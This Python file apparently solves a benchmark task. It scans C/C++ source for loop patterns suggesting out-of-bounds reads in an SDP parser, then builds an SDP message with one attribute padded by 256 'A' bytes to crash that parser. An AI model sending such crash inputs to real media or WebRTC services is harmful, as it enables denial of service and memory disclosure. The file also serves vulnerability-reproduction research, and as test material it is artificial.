import os
import re
import tarfile
from typing import Dict, Iterable, List, Optional, Tuple


class Solution:
    def __init__(self) -> None:
        self._keys_pref = [
            "rtpmap",
            "extmap",
            "fmtp",
            "fingerprint",
            "candidate",
            "ssrc-group",
            "ssrc",
            "group",
            "msid",
            "rid",
            "simulcast",
            "rtcp-fb",
            "sctpmap",
            "setup",
            "crypto",
            "ice-ufrag",
            "ice-pwd",
            "mid",
        ]
        self._suspicious_re = [
            re.compile(
                r"(?:while|for)\s*\(\s*[^)]*\bvalue\s*\[\s*(\w+)\s*\][^)]*&&[^)]*\b\1\s*<\s*value\.(?:size|length)\s*\(\s*\)",
                re.IGNORECASE | re.DOTALL,
            ),
            re.compile(
                r"(?:while|for)\s*\(\s*[^)]*\*\s*(\w+)\s*[^)]*&&[^)]*\b\1\s*<\s*end\b",
                re.IGNORECASE | re.DOTALL,
            ),
            re.compile(
                r"(?:while|for)\s*\(\s*[^)]*\b(\w+)\s*<\s*value\.(?:size|length)\s*\(\s*\)[^)]*&&[^)]*\bvalue\s*\[\s*\1\s*\]",
                re.IGNORECASE | re.DOTALL,
            ),
        ]

    def _iter_source_files(self, src_path: str) -> Iterable[Tuple[str, bytes]]:
        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    low = fn.lower()
                    if not low.endswith((".c", ".cc", ".cpp", ".h", ".hpp", ".inc", ".ipp")):
                        continue
                    path = os.path.join(root, fn)
                    try:
                        st = os.stat(path)
                    except OSError:
                        continue
                    if st.st_size <= 0 or st.st_size > 2_000_000:
                        continue
                    try:
                        with open(path, "rb") as f:
                            yield (path, f.read())
                    except OSError:
                        continue
            return

        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name
                    low = name.lower()
                    if not low.endswith((".c", ".cc", ".cpp", ".h", ".hpp", ".inc", ".ipp")):
                        continue
                    if m.size <= 0 or m.size > 2_000_000:
                        continue
                    if "sdp" not in low and "parser" not in low:
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                    except Exception:
                        continue
                    yield (name, data)
        except Exception:
            return

    def _score_keys_from_sources(self, src_path: str) -> Dict[str, int]:
        scores: Dict[str, int] = {k: 0 for k in self._keys_pref}
        for path, data in self._iter_source_files(src_path):
            low_path = path.lower()
            try:
                text = data.decode("utf-8", "ignore")
            except Exception:
                continue
            low_text = text.lower()

            base_boost = 0
            if "sdp" in low_path:
                base_boost += 1
            if "parser" in low_path:
                base_boost += 1
            if "parser/sdp" in low_path.replace("\\", "/") or ("parser" in low_path and "sdp" in low_path):
                base_boost += 2

            for k in self._keys_pref:
                if k in low_text:
                    scores[k] += base_boost + 1

            if not any(r.search(text) for r in self._suspicious_re):
                continue

            lines = text.splitlines()
            n = len(lines)
            for i in range(n):
                window = "\n".join(lines[i : i + 6])
                if not any(r.search(window) for r in self._suspicious_re):
                    continue
                low_w = window.lower()
                for k in self._keys_pref:
                    if k in low_w:
                        scores[k] += 20
        return scores

    def _choose_key(self, src_path: str) -> str:
        scores = self._score_keys_from_sources(src_path)
        best_key = "rtpmap"
        best_score = -1
        for k in self._keys_pref:
            s = scores.get(k, 0)
            if s > best_score:
                best_score = s
                best_key = k
        if best_score < 2:
            return "rtpmap"
        return best_key

    def _base_sdp(self) -> bytes:
        return (
            b"v=0\r\n"
            b"o=- 0 0 IN IP4 127.0.0.1\r\n"
            b"s=-\r\n"
            b"t=0 0\r\n"
            b"m=audio 9 UDP/TLS/RTP/SAVPF 111\r\n"
            b"c=IN IP4 0.0.0.0\r\n"
        )

    def _make_attr_line(self, key: str, long_token: bytes) -> bytes:
        if key == "rtpmap":
            return b"a=rtpmap:111 " + long_token
        if key == "fmtp":
            return b"a=fmtp:111" + long_token
        if key == "extmap":
            return b"a=extmap:1" + long_token
        if key == "fingerprint":
            return b"a=fingerprint:sha-256" + long_token
        if key == "candidate":
            return b"a=candidate:" + long_token
        if key == "ssrc-group":
            return b"a=ssrc-group:FID" + long_token
        if key == "ssrc":
            return b"a=ssrc:1" + long_token
        if key == "group":
            return b"a=group:BUNDLE" + long_token
        if key == "msid":
            return b"a=msid:" + long_token
        if key == "rid":
            return b"a=rid:1" + long_token
        if key == "simulcast":
            return b"a=simulcast:send" + long_token
        if key == "rtcp-fb":
            return b"a=rtcp-fb:111" + long_token
        if key == "sctpmap":
            return b"a=sctpmap:5000" + long_token
        if key == "setup":
            return b"a=setup" + long_token
        if key == "crypto":
            return b"a=crypto:1" + long_token
        if key == "ice-ufrag":
            return b"a=ice-ufrag:" + long_token
        if key == "ice-pwd":
            return b"a=ice-pwd:" + long_token
        if key == "mid":
            return b"a=mid:" + long_token
        return b"a=rtpmap:111 " + long_token

    def solve(self, src_path: str) -> bytes:
        key = self._choose_key(src_path)
        long_token = b"A" * 256
        sdp = self._base_sdp() + self._make_attr_line(key, long_token) + b"\r\n"
        return sdp